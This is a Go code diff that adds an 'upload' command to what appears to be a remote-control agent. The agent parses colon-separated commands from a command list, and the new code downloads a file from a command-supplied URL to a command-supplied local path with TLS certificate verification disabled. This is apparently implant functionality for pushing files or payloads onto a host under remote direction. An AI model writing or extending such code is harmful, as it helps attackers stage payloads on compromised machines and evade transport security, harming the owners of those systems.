@@ -13,6 +13,8 @@ import (
    "os/exec"
    "mime/multipart"
    "bytes"
+   "log"
+   "net/url"
 )
 
 
@@ -131,6 +133,59 @@ for _, line := range strings.Split(strings.TrimRight(cmds, "\n"), "\n") {
 	}
       fmt.Println(gimme)	
       }
+      
+       if act == "upload"{
+       
+       http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+       
+      urldl := strings.Split(line, ":")[2] + ":" + strings.Split(line, ":")[3] 
+      pathdl := strings.Split(line, ":")[4]      
+      
+     
+
+    fileURL, err := url.Parse(urldl)
+    if err != nil {
+        log.Fatal(err)
+    }
+    path := fileURL.Path
+    segments := strings.Split(path, "/")
+    fileName := segments[len(segments)-1]
+    
+      fmt.Println(urldl)
+      fmt.Println(pathdl)
+      fmt.Println(fileName)
+    
+    file, err := os.Create(pathdl)
+    if err != nil {
+        log.Fatal(err)
+    }
+    client := http.Client{
+        CheckRedirect: func(r *http.Request, via []*http.Request) error {
+            r.URL.Opaque = r.URL.Path
+            return nil
+        },
+    }
+    
+    resp, err := client.Get(urldl)
+    if err != nil {
+        log.Fatal(err)
+    }
+    defer resp.Body.Close()
+ 
+    size, err := io.Copy(file, resp.Body)
+    fmt.Println(size)
+    defer file.Close()
+    
+     
+
+      
+      
+	
+      }
+      
+      
+      
+      
 }
       }
 
